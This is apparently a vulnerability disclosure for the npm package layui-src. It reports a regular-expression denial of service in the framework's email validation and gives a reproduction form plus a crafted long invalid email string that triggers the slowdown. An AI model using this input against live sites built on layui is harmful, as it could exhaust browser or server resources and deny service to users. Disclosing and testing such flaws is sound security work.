**Submission details:**

**Package Manager:** npm
**Affected module:** layui-src
**Link to published package:** https://github.com/sentsin/layui
**Link to GitHub repo:** https://github.com/sentsin/layui
**Other vulnerability type:** 
**Severity level:** High
**Module Description:** Classic modular front-end UI framework

**Vulnerability Description:**

It allows cause a denial of service when validating crafted invalid emails.



**Steps to reproduce:**

1. Create an HTML file with the following code

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>email</title>
    <link rel="stylesheet" href="src/css/layui.css">
    <style>
        body {
            padding: 10px;
        }
    </style>
</head>
<body>

<form class="layui-form layui-form-pane1" action="" lay-filter="first">
    <div class="layui-form-item">
        <label class="layui-form-label">email</label>
        <div class="layui-input-block">
            <input type="email" name="email" lay-verify="email" lay-verType="alert" autocomplete="off"
                   class="layui-input">
        </div>
    </div>
    <div class="layui-form-item">
        <div class="layui-input-block">
            <button class="layui-btn" lay-submit lay-filter="*">submit</button>
        </div>
    </div>
</form>

<br><br><br>

<script src="src/layui.js"></script>
<!-- <script src="../build/lay/dest/layui.all.js"></script> -->

<script>
    layui.use(['form', 'layedit', 'laydate'], function () {
        var form = layui.form;
        //监听提交
        form.on('submit(*)', function (data) {
            console.log(data);
            alert(JSON.stringify(data.field));
            return false;
        });

    });

</script>
</body>
```

2. Input string a@a.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!!!
3. Click the submit button



You can execute `./PoC/layui_demo/index.html`

**Did I contact the maintainer:** No
**Did I open an issue:** No